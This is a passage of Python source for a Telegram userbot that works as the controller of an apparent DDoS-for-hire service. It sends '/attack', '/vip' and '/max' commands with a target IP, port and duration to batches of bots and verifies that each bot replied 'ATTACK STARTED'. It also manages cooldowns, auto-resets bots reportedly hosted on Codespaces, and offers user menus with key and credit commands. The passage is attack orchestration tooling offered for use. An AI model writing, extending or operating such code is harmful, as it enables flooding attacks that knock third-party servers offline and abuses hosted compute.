    def __init__(self, api_id: int, api_hash: str, phone: str):
        self.api_id = api_id
        self.api_hash = api_hash
        self.phone = phone
        self.client: Optional[TelegramClient] = None
        self.is_ready = False
        self.command_queue: asyncio.Queue = asyncio.Queue()
        self.response_cache: Dict[str, bool] = {}
        self.bot_entity_cache: Dict[str, any] = {}
        self._stop_event: asyncio.Event = asyncio.Event()
        self._pending_reset_logs: Dict[str, List[str]] = {}
        self.pending_resets: Dict[str, Dict] = {}

    async def start(self):
        self.client = TelegramClient('user_session', self.api_id, self.api_hash)
        await self.client.start(phone=self.phone)
        self.is_ready = True
        logger.info(f"User client started")
        asyncio.create_task(self._process_queue())
        asyncio.create_task(self._listen_responses())
        asyncio.create_task(self._keep_alive())
        return self

    async def _keep_alive(self):
        while not self._stop_event.is_set():
            try:
                await asyncio.sleep(60)
                if self.client and self.client.is_connected():
                    await self.client.get_me()
            except:
                pass

    async def disconnect(self):
        self._stop_event.set()
        if self.client and self.client.is_connected():
            await self.client.disconnect()
        self.is_ready = False

    async def _ensure_connected(self):
        if not self.client or not self.client.is_connected():
            logger.warning("Client not connected, reconnecting...")
            if self.client:
                try:
                    await self.client.disconnect()
                except:
                    pass
            self.client = TelegramClient('user_session', self.api_id, self.api_hash)
            await self.client.start(phone=self.phone)
            self.is_ready = True
        return True

    async def _listen_responses(self):
        @self.client.on(events.NewMessage)
        async def handler(event: events.NewMessage.Event):
            if event.is_private:
                if not event.message.from_id:
                    return
                try:
                    sender = await event.get_sender()
                    if not sender or not sender.username:
                        return
                    if sender.username in ALL_BOTS:
                        bot_username = sender.username
                        bot_display = self.get_bot_display_name(bot_username)
                        text = event.message.text if event.message.text else ""
                        logger.info(f"📨 Bot response from {bot_username}: {text[:200]}")
                        if state.status_check_results:
                            for key, status_data in state.status_check_results.items():
                                if bot_username in status_data.get("pending_bots", []):
                                    status_data["results"][bot_username] = True
                                    logger.info(f"✅ Bot {bot_display} is ONLINE")
                        target_key = None
                        for key, pending in state.pending_attacks.items():
                            expected_bots = pending.get("expected_bots", [])
                            if bot_username in expected_bots:
                                target_key = key
                                break
                        if target_key is None:
                            return
                        pending = state.pending_attacks[target_key]
                        expected_ip = pending.get("ip", "")
                        expected_port = pending.get("port", "")
                        expected_duration = pending.get("duration", "")
                        dosage_key = pending.get("dosage_key", "attack")
                        has_attack_started = any(keyword in text for keyword in [
                            "ATTACK STARTED", "𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃", "attack started"
                        ])
                        ip_match = re.search(r'𝐓𝐚𝐫𝐠𝐞𝐭:\s*([\d\.]+)', text)
                        parsed_ip = ip_match.group(1) if ip_match else None
                        port_match = re.search(r'𝐏𝐨𝐫𝐭:\s*(\d+)', text)
                        parsed_port = port_match.group(1) if port_match else None
                        time_match = re.search(r'𝐓𝐢𝐦𝐞:\s*(\d+)\s*𝐒𝐞𝐜𝐨𝐧𝐝𝐬', text)
                        parsed_time = time_match.group(1) if time_match else None
                        ip_match_ok = parsed_ip and parsed_ip == expected_ip
                        port_match_ok = parsed_port and parsed_port == expected_port
                        time_match_ok = parsed_time and parsed_time == expected_duration
                        responded = has_attack_started and ip_match_ok and port_match_ok and time_match_ok
                        logger.info(f"🔍 Verify response from {bot_display}: has_started={has_attack_started}, ip={parsed_ip}=={expected_ip} ({ip_match_ok}), port={parsed_port}=={expected_port} ({port_match_ok}), time={parsed_time}=={expected_duration} ({time_match_ok})")
                        self.response_cache[bot_username] = responded
                        prefix = "logm" if dosage_key == "max" else ("logv" if dosage_key == "vip" else "log")
                        command = pending.get("command", "unknown")
                        if responded:
                            log_msg = f"/{prefix} •{bot_display}: ✅ đã nhận lệnh"
                        else:
                            log_msg = f"/{prefix} •{bot_display}: ❌ không nhận lệnh"
                            if not has_attack_started:
                                log_msg += " (không có ATTACK STARTED)"
                            elif not ip_match_ok:
                                log_msg += f" (IP không khớp: {parsed_ip} != {expected_ip})"
                            elif not port_match_ok:
                                log_msg += f" (Port không khớp: {parsed_port} != {expected_port})"
                            elif not time_match_ok:
                                log_msg += f" (Time không khớp: {parsed_time} != {expected_duration})"
                            else:
                                log_msg += " (lỗi không xác định)"
                        log_msg += f"\n•lệnh: {command}"
                        if dosage_key == "vip":
                            target_group = LOGV_GROUP_ID
                        elif dosage_key == "max":
                            target_group = LOGM_GROUP_ID
                        else:
                            target_group = LOG_GROUP_ID
                        try:
                            if target_group != 0:
                                await self.client.send_message(int(target_group), log_msg)
                                logger.info(f"📤 Đã gửi log {prefix} cho {bot_display} vào nhóm {target_group}")
                        except Exception as e:
                            logger.error(f"Failed to send log: {e}")
                        log_data = {
                            "action": "log_received",
                            "dosage_key": dosage_key,
                            "response_prefix": prefix,
                            "bot_display": bot_display,
                            "responded": responded,
                            "command": command,
                            "chat_id": target_group,
                            "full_text": log_msg,
                            "parsed_ip": parsed_ip,
                            "parsed_port": parsed_port,
                            "parsed_time": parsed_time,
                            "expected_ip": expected_ip,
                            "expected_port": expected_port,
                            "expected_time": expected_duration
                        }
                        await log_queue_manager.put_log(log_data)
                        logger.info(f"📨 Đã đưa log vào queue: {prefix} {bot_display} (responded={responded})")
                except Exception as e:
                    logger.error(f"Error in private message handler: {e}", exc_info=True)
                return
            try:
                chat = await event.get_chat()
                if not chat:
                    return
                chat_id = chat.id

                if chat_id in [BOT_MOTHER_GROUP_ID_1, BOT_MOTHER_GROUP_ID_2, BOT_MOTHER_GROUP_ID_3]:
                    text = event.message.text if event.message.text else ""
                    logger.info(f"📨 Tin nhắn từ bot mẹ group {chat_id}: {text[:200]}")
                    if "BÁO CÁO VẬN HÀNH CODESPACES (BATCH-LOCK)" in text:
                        logger.info("🔍 Phát hiện báo cáo trạng thái từ bot mẹ, đang phân tích...")
                        bot_statuses = {}
                        lines = text.split('\n')
                        current_bot = None
                        for line in lines:
                            line = line.strip()
                            if line.startswith('📁'):
                                match = re.search(r'📁\s+(\S+)', line)
                                if match:
                                    current_bot = match.group(1)
                            elif line.startswith('↳') and current_bot:
                                if "Active: Đã kích hoạt hoàn tất" in line or "Active: Đã kích hoạt hoàn tất 🟢" in line:
                                    bot_statuses[current_bot] = "active"
                                else:
                                    bot_statuses[current_bot] = "inactive"
                                current_bot = None
                        logger.info(f"📊 Trạng thái bot từ báo cáo: {bot_statuses}")
                        for reset_id, reset_data in list(self.pending_resets.items()):
                            if reset_data.get("confirmed", False):
                                continue
                            pending_bots = reset_data.get("bot_displays", [])
                            all_active = True
                            for bot in pending_bots:
                                if bot_statuses.get(bot) != "active":
                                    all_active = False
                                    break
                            if all_active:
                                reset_data["confirmed"] = True
                                reset_data["confirmation_time"] = time.time()
                                reset_data["status"] = "success"
                                callback = reset_data.get("callback")
                                if callback:
                                    try:
                                        await callback(reset_data["admin_chat_id"], pending_bots, True)
                                    except Exception as e:
                                        logger.error(f"Lỗi khi gọi callback reset: {e}")
                                self.pending_resets.pop(reset_id, None)
                                logger.info(f"✅ Reset {reset_id} thành công, tất cả bot đã active")
                            elif any(bot_statuses.get(bot) == "inactive" for bot in pending_bots):
                                reset_data["confirmed"] = True
                                reset_data["confirmation_time"] = time.time()
                                reset_data["status"] = "failed"
                                callback = reset_data.get("callback")
                                if callback:
                                    try:
                                        await callback(reset_data["admin_chat_id"], pending_bots, False)
                                    except Exception as e:
                                        logger.error(f"Lỗi khi gọi callback reset: {e}")
                                self.pending_resets.pop(reset_id, None)
                                logger.info(f"❌ Reset {reset_id} thất bại, có bot chưa active")

                if chat_id not in [LOG_GROUP_ID, LOGV_GROUP_ID, LOGM_GROUP_ID]:
                    return
                text = event.message.text
                if not text or not text.startswith('/log'):
                    return
                logger.info(f"📨 UserClient nhận được log từ nhóm {chat_id}: {text[:100]}...")
                log_data = await self._parse_log_message(event, chat_id)
                if log_data:
                    await log_queue_manager.put_log(log_data)
            except Exception as e:
                logger.error(f"Error in log listener: {e}", exc_info=True)

    async def _parse_log_message(self, event, chat_id: int) -> Optional[Dict]:
        try:
            text = event.message.text
            log_match = re.match(r'^/log(v|m)?', text)
            if not log_match:
                return None
            prefix = log_match.group(1) or ""
            if prefix == "v":
                dosage_key = "vip"
                response_prefix = "logv"
            elif prefix == "m":
                dosage_key = "max"
                response_prefix = "logm"
            else:
                dosage_key = "attack"
                response_prefix = "log"
            bot_match = re.search(r'•([^:]+):\s*(✅|❌)\s*([^\n]+)', text)
            if not bot_match:
                lines = text.split('\n')
                for line in lines:
                    if '•' in line and ('✅' in line or '❌' in line):
                        parts = line.split('•')
                        if len(parts) >= 2:
                            bot_part = parts[1]
                            if ':' in bot_part:
                                bot_display = bot_part.split(':')[0].strip()
                                status = '✅' if '✅' in bot_part else '❌'
                                responded = status == '✅'
                                cmd_match = re.search(r'•lệnh:\s*(.+)', text)
                                command = cmd_match.group(1).strip() if cmd_match else "unknown"
                                return {
                                    "action": "log_received",
                                    "dosage_key": dosage_key,
                                    "response_prefix": response_prefix,
                                    "bot_display": bot_display,
                                    "responded": responded,
                                    "command": command,
                                    "chat_id": chat_id,
                                    "full_text": text
                                }
                return None
            bot_display = bot_match.group(1).strip()
            responded = bot_match.group(2) == "✅"
            cmd_match = re.search(r'•lệnh:\s*(.+)', text)
            command = cmd_match.group(1).strip() if cmd_match else "unknown"
            return {
                "action": "log_received",
                "dosage_key": dosage_key,
                "response_prefix": response_prefix,
                "bot_display": bot_display,
                "responded": responded,
                "command": command,
                "chat_id": chat_id,
                "full_text": text
            }
        except Exception as e:
            logger.error(f"Parse log error: {e}", exc_info=True)
            return None

    def get_bot_display_name(self, username: str) -> str:
        return BOT_DISPLAY_MAPPING.get(username, username)

    def get_log_prefix(self, dosage_key: str) -> str:
        if dosage_key == "attack":
            return "log"
        elif dosage_key == "vip":
            return "logv"
        elif dosage_key == "max":
            return "logm"
        return "log"

    async def get_bot_entity_safe(self, bot_username: str):
        if bot_username in self.bot_entity_cache:
            return self.bot_entity_cache[bot_username]
        try:
            await self._ensure_connected()
            entity = await self.client.get_entity(f"@{bot_username}")
            self.bot_entity_cache[bot_username] = entity
            return entity
        except:
            return None

    def get_bot_mother_group(self, bot_username: str) -> int:
        if bot_username in BOT_MOTHER_1_BOTS:
            return 1
        elif bot_username in BOT_MOTHER_2_BOTS:
            return 2
        elif bot_username in BOT_MOTHER_3_BOTS:
            return 3
        return 0

    def get_bot_mother_id(self, bot_username: str) -> int:
        if bot_username in BOT_MOTHER_1_BOTS:
            return int(BOT_MOTHER_GROUP_ID_1)
        elif bot_username in BOT_MOTHER_2_BOTS:
            return int(BOT_MOTHER_GROUP_ID_2)
        elif bot_username in BOT_MOTHER_3_BOTS:
            return int(BOT_MOTHER_GROUP_ID_3)
        return None

    async def _send_reset_to_mother(self, mother_id: int, reset_msg: str, bot_displays: List[str]) -> bool:
        try:
            await self._ensure_connected()
            await self.client.send_message(mother_id, reset_msg)
            log_msg = f"/logreset •Đã gửi reset: {', '.join(bot_displays)}"
            await self.client.send_message(int(LOG_GROUP_ID), log_msg)
            return True
        except Exception as e:
            logger.error(f"Send reset to mother {mother_id} failed: {e}")
            return False

    async def _send_bulk_reset(self, bot_usernames: List[str]) -> Tuple[bool, str]:
        if not bot_usernames:
            return False, "Không có bot để reset"
        mother_1_bots = []
        mother_2_bots = []
        mother_3_bots = []
        for bot in bot_usernames:
            if bot in BOT_MOTHER_1_BOTS:
                mother_1_bots.append(self.get_bot_display_name(bot))
            elif bot in BOT_MOTHER_2_BOTS:
                mother_2_bots.append(self.get_bot_display_name(bot))
            elif bot in BOT_MOTHER_3_BOTS:
                mother_3_bots.append(self.get_bot_display_name(bot))
        results = []
        if mother_1_bots:
            reset_msg = f"/reset {' '.join(mother_1_bots)}"
            result = await self._send_reset_to_mother(int(BOT_MOTHER_GROUP_ID_1), reset_msg, mother_1_bots)
            results.append(result)
            for bot in bot_usernames:
                if bot in BOT_MOTHER_1_BOTS:
                    state.mark_bot_reset(bot)
        if mother_2_bots:
            reset_msg = f"/reset {' '.join(mother_2_bots)}"
            result = await self._send_reset_to_mother(int(BOT_MOTHER_GROUP_ID_2), reset_msg, mother_2_bots)
            results.append(result)
            for bot in bot_usernames:
                if bot in BOT_MOTHER_2_BOTS:
                    state.mark_bot_reset(bot)
        if mother_3_bots:
            reset_msg = f"/reset {' '.join(mother_3_bots)}"
            result = await self._send_reset_to_mother(int(BOT_MOTHER_GROUP_ID_3), reset_msg, mother_3_bots)
            results.append(result)
            for bot in bot_usernames:
                if bot in BOT_MOTHER_3_BOTS:
                    state.mark_bot_reset(bot)
        return all(results), "Đã gửi reset đến các bot mẹ"

    async def _execute_reset_flow_by_cluster(self, admin_chat_id: int, cluster_1: List[str], cluster_2: List[str], cluster_3: List[str]):
        async def send_and_wait(mother_id: int, bots: List[str], cluster_name: str):
            if not bots:
                return
            displays = [self.get_bot_display_name(b) for b in bots]
            reset_msg = f"/reset {' '.join(displays)}"
            try:
                await self._ensure_connected()
                await self.client.send_message(mother_id, reset_msg)
                for b in bots:
                    state.mark_bot_reset(b)
                wait_time = len(bots) * 60
                try:
                    await self.client.send_message(
                        admin_chat_id,
                        f"🔄 Đã gửi yêu cầu reset đến {cluster_name}: {', '.join(displays)}\n"
                        f"⏳ Chờ {wait_time} giây ({len(bots)} bot × 60s) để bot khởi động lại..."
                    )
                except Exception as e:
                    logger.error(f"Failed to send reset start notification: {e}")
                await asyncio.sleep(wait_time)
                for b in bots:
                    if b in state.pending_reset:
                        del state.pending_reset[b]
                        logger.info(f"Bot {b} đã được giải phóng khỏi pending_reset sau {wait_time}s")
                try:
                    await self.client.send_message(
                        admin_chat_id,
                        f"✅ {cluster_name} đã reset xong: {', '.join(displays)}"
                    )
                except Exception as e:
                    logger.error(f"Failed to send reset done notification: {e}")
            except Exception as e:
                logger.error(f"Reset {cluster_name} failed: {e}")
                try:
                    await self.client.send_message(
                        admin_chat_id,
                        f"❌ Lỗi khi gửi reset đến {cluster_name}: {str(e)}"
                    )
                except:
                    pass

        tasks = []
        if cluster_1:
            tasks.append(send_and_wait(int(BOT_MOTHER_GROUP_ID_1), cluster_1, "Cụm 1"))
        if cluster_2:
            tasks.append(send_and_wait(int(BOT_MOTHER_GROUP_ID_2), cluster_2, "Cụm 2"))
        if cluster_3:
            tasks.append(send_and_wait(int(BOT_MOTHER_GROUP_ID_3), cluster_3, "Cụm 3"))
        if tasks:
            await asyncio.gather(*tasks)

    async def _send_offline_notification(self, bot_display: str, bot_username: str, command_key: str):
        try:
            log_msg = f"/off {bot_display}"
            await self.client.send_message(int(LOG_GROUP_ID), log_msg)
            if command_key not in self._pending_reset_logs:
                self._pending_reset_logs[command_key] = []
            if bot_display not in self._pending_reset_logs[command_key]:
                self._pending_reset_logs[command_key].append(bot_display)
        except Exception as e:
            logger.error(f"Offline notification failed: {e}")

    async def _trigger_reset_if_complete(self, command_key: str, expected_count: int):
        if command_key not in self._pending_reset_logs:
            return
        offline_bots = self._pending_reset_logs[command_key]
        if len(offline_bots) < 2:
            return
        cluster_1_bots = []
        cluster_2_bots = []
        cluster_3_bots = []
        display_to_username = {}
        for bot, display in BOT_DISPLAY_MAPPING.items():
            display_to_username[display] = bot
        for display in offline_bots:
            if display in display_to_username:
                bot_username = display_to_username[display]
                if bot_username in BOT_MOTHER_1_BOTS:
                    cluster_1_bots.append(display)
                elif bot_username in BOT_MOTHER_2_BOTS:
                    cluster_2_bots.append(display)
                elif bot_username in BOT_MOTHER_3_BOTS:
                    cluster_3_bots.append(display)
        cluster_name = ""
        bots_to_reset = []
        if cluster_1_bots and not cluster_2_bots and not cluster_3_bots:
            cluster_name = "Cụm 1"
            bots_to_reset = cluster_1_bots
        elif cluster_2_bots and not cluster_1_bots and not cluster_3_bots:
            cluster_name = "Cụm 2"
            bots_to_reset = cluster_2_bots
        elif cluster_3_bots and not cluster_1_bots and not cluster_2_bots:
            cluster_name = "Cụm 3"
            bots_to_reset = cluster_3_bots
        else:
            parts = []
            if cluster_1_bots:
                parts.append("Cụm 1")
            if cluster_2_bots:
                parts.append("Cụm 2")
            if cluster_3_bots:
                parts.append("Cụm 3")
            cluster_name = " + ".join(parts) if parts else "Không xác định"
            bots_to_reset = offline_bots

        if state.auto_reset:
            bot_usernames = []
            for display in bots_to_reset:
                if display in display_to_username:
                    bot_usernames.append(display_to_username[display])
            if bot_usernames:
                await self._send_bulk_reset(bot_usernames)
                try:
                    await self.client.send_message(
                        int(ADMIN_ID),
                        f"🔄 [AUTO] Đã gửi lệnh reset các bot: {', '.join(bots_to_reset)}"
                    )
                    logger.info(f"🔄 [AUTO] Đã gửi lệnh reset các bot: {', '.join(bots_to_reset)}")
                except Exception as e:
                    logger.error(f"Failed to send auto reset notification: {e}")
            if command_key in self._pending_reset_logs:
                del self._pending_reset_logs[command_key]
            return

        bot_list_str = ", ".join(bots_to_reset)
        confirm_msg = (
            f"⚠️ <b>Phát hiện {len(offline_bots)} bot offline:</b>\n"
            f"   {bot_list_str}\n"
            f"   (thuộc {cluster_name})\n\n"
            f"Bạn có muốn tự động reset các bot này?"
        )
        keyboard = [
            [
                InlineKeyboardButton("🔄 Reset", callback_data=f"reset_confirm_reset_{command_key}"),
                InlineKeyboardButton("❌ Hủy", callback_data=f"reset_confirm_cancel_{command_key}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        state.pending_reset_confirm[command_key] = {
            "offline_bots": offline_bots,
            "bots_to_reset": bots_to_reset,
            "cluster_name": cluster_name,
            "display_to_username": display_to_username
        }
        try:
            await self.client.send_message(
                int(ADMIN_ID),
                confirm_msg,
                reply_markup=reply_markup,
                parse_mode="HTML"
            )
            logger.info(f"📨 Đã gửi tin nhắn xác nhận reset đến Admin cho {command_key}")
            logger.info(f"   Bot offline: {', '.join(offline_bots)} (>=2 bots)")
        except Exception as e:
            logger.error(f"Failed to send reset confirmation to admin: {e}")

    async def handle_reset_confirm(self, command_key: str, action: str):
        pending = state.pending_reset_confirm.get(command_key)
        if not pending:
            logger.warning(f"❌ Không tìm thấy pending reset confirm cho {command_key}")
            return
        offline_bots = pending.get("offline_bots", [])
        bots_to_reset = pending.get("bots_to_reset", [])
        cluster_name = pending.get("cluster_name", "")
        display_to_username = pending.get("display_to_username", {})
        if action == "reset":
            bot_usernames = []
            for display in bots_to_reset:
                if display in display_to_username:
                    bot_usernames.append(display_to_username[display])
            if bot_usernames:
                cluster_1 = [b for b in bot_usernames if b in BOT_MOTHER_1_BOTS]
                cluster_2 = [b for b in bot_usernames if b in BOT_MOTHER_2_BOTS]
                cluster_3 = [b for b in bot_usernames if b in BOT_MOTHER_3_BOTS]
                try:
                    await self.client.send_message(
                        int(ADMIN_ID),
                        f"🔄 Đang xử lý reset cho các bot: {', '.join(bots_to_reset)}"
                    )
                except Exception as e:
                    logger.error(f"Failed to send reset processing notification: {e}")
                asyncio.create_task(self._execute_reset_flow_by_cluster(
                    int(ADMIN_ID), cluster_1, cluster_2, cluster_3
                ))
            else:
                await self.client.send_message(
                    int(ADMIN_ID),
                    "❌ Không tìm thấy bot để reset."
                )
        else:
            await self.client.send_message(
                int(ADMIN_ID),
                f"❌ Đã hủy reset cho các bot ({', '.join(bots_to_reset)}) trong {cluster_name}."
            )
            logger.info(f"❌ Đã hủy reset cho {', '.join(bots_to_reset)}")
        if command_key in state.pending_reset_confirm:
            del state.pending_reset_confirm[command_key]
        if command_key in self._pending_reset_logs:
            del self._pending_reset_logs[command_key]

    async def _send_cooldown_notification(self, bot_displays: List[str]):
        if not bot_displays:
            return
        all_bots = ALL_BOTS
        available_bots = []
        for bot in all_bots:
            if state.is_bot_available(bot):
                available_bots.append(self.get_bot_display_name(bot))
        cooldown_msg = f"/cooldown •{', '.join(bot_displays)}: đang cooldown ({COOLDOWN_TIME}s)"
        if available_bots:
            cooldown_msg += f"\n•Có sẵn: {', '.join(available_bots)}"
        else:
            cooldown_msg += f"\n•Có sẵn: Không có"
        try:
            await self.client.send_message(int(LOG_GROUP_ID), cooldown_msg)
        except:
            pass

    async def check_bots_status(self, bot_list: List[str], status_key: int) -> Dict[str, bool]:
        results = {}
        pending_bots = []
        for bot_username in bot_list:
            try:
                entity = await self.get_bot_entity_safe(bot_username)
                if entity:
                    await self._ensure_connected()
                    await self.client.send_message(entity, "/start")
                    pending_bots.append(bot_username)
                    results[bot_username] = False
                    logger.info(f"📤 Đã gửi /start đến {self.get_bot_display_name(bot_username)}")
                else:
                    results[bot_username] = False
                    logger.warning(f"❌ Không tìm thấy bot {bot_username}")
            except Exception as e:
                logger.error(f"Error sending /start to {bot_username}: {e}")
                results[bot_username] = False
        if status_key not in state.status_check_results:
            state.status_check_results[status_key] = {
                "pending_bots": pending_bots,
                "results": results,
                "start_time": time.time()
            }
        start_time = time.time()
        while time.time() - start_time < STATUS_CHECK_TIMEOUT:
            status_data = state.status_check_results.get(status_key, {})
            results = status_data.get("results", {})
            pending = status_data.get("pending_bots", [])
            all_responded = all(results.get(bot, False) for bot in pending) if pending else True
            if all_responded:
                logger.info(f"✅ Tất cả {len(pending)} bot đã phản hồi")
                break
            await asyncio.sleep(1)
        if status_key in state.status_check_results:
            del state.status_check_results[status_key]
        return results

    async def _send_to_single_bot(self, bot_username: str, command: str, dosage_key: str, command_key: str, cooldown_time: int = 35) -> Dict:
        bot_display = self.get_bot_display_name(bot_username)
        if not state.is_bot_available(bot_username):
            remaining = state.get_cooldown_remaining(bot_username)
            return {
                "bot_username": bot_username,
                "bot_display": bot_display,
                "responded": False,
                "error": f"Cooldown {remaining}s",
                "cooldown": True
            }
        try:
            entity = await self.get_bot_entity_safe(bot_username)
            if entity is None:
                await self._send_offline_notification(bot_display, bot_username, command_key)
                return {"bot_username": bot_username, "bot_display": bot_display, "responded": False, "error": "Username not found"}
            await self._ensure_connected()
            self.response_cache[bot_username] = False
            await self.client.send_message(entity, command)
            start_time = time.time()
            responded = False
            while time.time() - start_time < RESPONSE_TIMEOUT:
                if self.response_cache.get(bot_username, False):
                    responded = True
                    break
                await asyncio.sleep(0.3)
            if responded:
                state.mark_bot_used(bot_username, cooldown_time)
                return {"bot_username": bot_username, "bot_display": bot_display, "responded": True}
            logger.info(f"🔁 Bot {bot_display} không phản hồi lần 1, gửi /start để kiểm tra sống còn...")
            self.response_cache[bot_username] = False
            await self.client.send_message(entity, "/start")
            start_check = time.time()
            alive = False
            while time.time() - start_check < 3:
                if self.response_cache.get(bot_username, False):
                    alive = True
                    break
                await asyncio.sleep(0.3)
            if not alive:
                await self._send_offline_notification(bot_display, bot_username, command_key)
                return {"bot_username": bot_username, "bot_display": bot_display, "responded": False, "error": "No response after /start"}
            logger.info(f"✅ Bot {bot_display} online, gửi lại lệnh lần 2...")
            self.response_cache[bot_username] = False
            await self.client.send_message(entity, command)
            start_time2 = time.time()
            responded2 = False
            while time.time() - start_time2 < RESPONSE_TIMEOUT:
                if self.response_cache.get(bot_username, False):
                    responded2 = True
                    break
                await asyncio.sleep(0.3)
            if responded2:
                state.mark_bot_used(bot_username, cooldown_time)
                return {"bot_username": bot_username, "bot_display": bot_display, "responded": True}
            else:
                await self._send_offline_notification(bot_display, bot_username, command_key)
                return {"bot_username": bot_username, "bot_display": bot_display, "responded": False, "error": "No response after retry"}
        except Exception as e:
            logger.error(f"Error in _send_to_single_bot: {e}")
            await self._send_offline_notification(bot_display, bot_username, command_key)
            return {"bot_username": bot_username, "bot_display": bot_display, "responded": False, "error": str(e)}

    async def send_command_to_bots(self, bot_usernames: List[str], command: str, dosage_key: str, cooldown_time: int = 35) -> Dict:
        if not bot_usernames:
            return {"total_expected": 0, "total_responded": 0, "responded_bots": [], "unresponded_bots": [], "results": []}
        batch_config = BATCH_CONFIG.get(dosage_key, {"batch_size": 4, "batch_delay": 1.0})
        BATCH_SIZE = batch_config["batch_size"]
        BATCH_DELAY = batch_config["batch_delay"]
        command_key = f"{dosage_key}_{int(time.time())}"
        self._pending_reset_logs[command_key] = []
        total_expected = len(bot_usernames)
        all_results = []
        all_responded = []
        all_unresponded = []
        logger.info(f"📤 Bắt đầu gửi lệnh đến {total_expected} bot cho {dosage_key}, timeout={RESPONSE_TIMEOUT}s")
        for i in range(0, len(bot_usernames), BATCH_SIZE):
            batch = bot_usernames[i:i+BATCH_SIZE]
            tasks = []
            for bot_username in batch:
                self.response_cache[bot_username] = False
                tasks.append(self._send_to_single_bot(bot_username, command, dosage_key, command_key, cooldown_time))
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in batch_results:
                if isinstance(result, Exception):
                    logger.error(f"Batch error: {result}")
                    continue
                bot_username = result.get("bot_username")
                if result.get("responded", False):
                    all_responded.append(bot_username)
                else:
                    all_unresponded.append(bot_username)
                all_results.append(result)
            if i + BATCH_SIZE < len(bot_usernames) and BATCH_DELAY > 0:
                await asyncio.sleep(BATCH_DELAY)
        await self._trigger_reset_if_complete(command_key, total_expected)
        logger.info(f"✅ Hoàn thành gửi lệnh: {len(all_responded)}/{total_expected} bot phản hồi trong {RESPONSE_TIMEOUT}s")
        return {
            "total_expected": total_expected,
            "total_responded": len(all_responded),
            "responded_bots": all_responded,
            "unresponded_bots": all_unresponded,
            "results": all_results
        }

    def get_bots_from_group_ids(self, group_ids: List[str]) -> List[str]:
        all_bots = []
        for gid in group_ids:
            if gid in GROUP_MAPPING:
                all_bots.extend(GROUP_MAPPING[gid]["bots"])
        return all_bots

    def get_available_bots_for_attack(self, required: int, group_ids: List[str]) -> List[str]:
        available_bots = state.get_available_bots_by_cluster()
        filtered_bots = []
        for bot in available_bots:
            for gid in group_ids:
                if bot in GROUP_MAPPING[gid]["bots"]:
                    filtered_bots.append(bot)
                    break
        if len(filtered_bots) < required:
            return filtered_bots
        return random.sample(filtered_bots, required)

    async def _process_queue(self):
        while True:
            try:
                item = await self.command_queue.get()
                if item is None:
                    break
                group_ids = item["group_ids"]
                command = item["command"]
                dosage_key = item["dosage_key"]
                cooldown_time = item.get("cooldown_time", 35)
                future = item["future"]
                try:
                    required = DOSAGE_CONFIG.get(dosage_key, 2)
                    bot_usernames = self.get_available_bots_for_attack(required, group_ids)
                    if not bot_usernames or len(bot_usernames) < required:
                        raise Exception("Không đủ bot khả dụng")
                    result = await self.send_command_to_bots(bot_usernames, command, dosage_key, cooldown_time)
                    future.set_result(result)
                except Exception as e:
                    future.set_exception(e)
                self.command_queue.task_done()
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Queue error: {e}")

    async def execute_command(self, group_ids: List[str], command: str, dosage_key: str, cooldown_time: int = 35) -> Dict:
        await self._ensure_connected()
        future = asyncio.get_event_loop().create_future()
        await self.command_queue.put({
            "group_ids": group_ids,
            "command": command,
            "dosage_key": dosage_key,
            "cooldown_time": cooldown_time,
            "future": future
        })
        return await future

# ===================================================================
# MENU TEXT
# ===================================================================

MENU_TEXT = (
    "```\n"
    "╔══════════════════════════════════╗\n"
    "║        ✦ 𝘽𝙊𝙏 𝙈𝙀𝙉𝙐 ✦              ║\n"
    "╠══════════════════════════════════╣\n"
    "║                                  ║\n"
    "║  ❖ 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎                    ║\n"
    "║  ──────────────────────────────  ║\n"
    "║                                  ║\n"
    "║  ⚙ /attack <ip> <port>          ║\n"
    "║  ⚡ /vip <ip> <port> <time>      ║\n"
    "║  🔥 /max <ip> <port> <time>      ║\n"
    "║  📊 /xu        ➜  Kiểm tra lượt   ║\n"
    "║  🔑 /getkey    ➜  Lấy key         ║\n"
    "║  🔐 /nhapkey   ➜  Nhập key        ║\n"
    "║                                  ║\n"
    "║  🔐 𝘼𝘿𝙈𝙄𝙉                      ║\n"
    "║  ──────────────────────────────  ║\n"
    "║                                  ║\n"
    "║  ⛭ /ng       ➜  Quản trị         ║\n"
    "║                                  ║\n"
    "╠══════════════════════════════════╣\n"
    "║       ◈ 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 ◈      ║\n"
    "║       𝘾𝙧𝙚: 𝙉𝙖𝙢𝙉𝙜𝙪𝙮𝙚𝙣 𝘿𝙚𝙫 𝙡ỏ      ║\n"
    "╚══════════════════════════════════╝\n"
    "```"
)

ADMIN_MENU_TEXT = (
    "```\n"
    "╔══════════════════════════════════╗\n"
    "║        ✦ 𝘼𝘿𝙈𝙄𝙉 𝙈𝙀𝙉𝙐 ✦            ║\n"
    "╠══════════════════════════════════╣\n"
    "║                                  ║\n"
    "║  ❖ 𝘼𝘿𝙈𝙄𝙉 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎              ║\n"
    "║  ──────────────────────────────  ║\n"
    "║                                  ║\n"
    "║  📊 /status   ➜  Kiểm tra bot     ║\n"
    "║  📋 /groups   ➜  Danh sách nhóm   ║\n"
    "║  📜 /history  ➜  Lịch sử lệnh     ║\n"
    "║  🆔 /getid    ➜  Lấy ID nhóm      ║\n"
    "║  📝 /listperm ➜  Danh sách quyền  ║\n"
    "║  🔎 /id       ➜  Lấy ID user      ║\n"
    "║  🟢 /on       ➜  Bật bot          ║\n"
    "║  🔴 /stop     ➜  Tắt bot          ║\n"
    "║  📤 /upload   ➜  Khôi phục dữ liệu ║\n"
    "║  🖥️ /cpu      ➜  Thông tin CPU/RAM ║\n"
    "║                                  ║\n"
    "║  ❖ Quản lý cụm server           ║\n"
    "║  ──────────────────────────────  ║\n"
    "║                                  ║\n"
    "║  🔓 /op    ➜  Cấp quyền cụm       ║\n"
    "║  🔒 /clean ➜  Thu hồi cụm         ║\n"
    "║                                  ║\n"
    "║  ❖ Quản lý quyền                ║\n"
    "║  ──────────────────────────────  ║\n"
    "║                                  ║\n"
    "║  ➕ /addt <id> ➜ Cấp quyền attack ║\n"
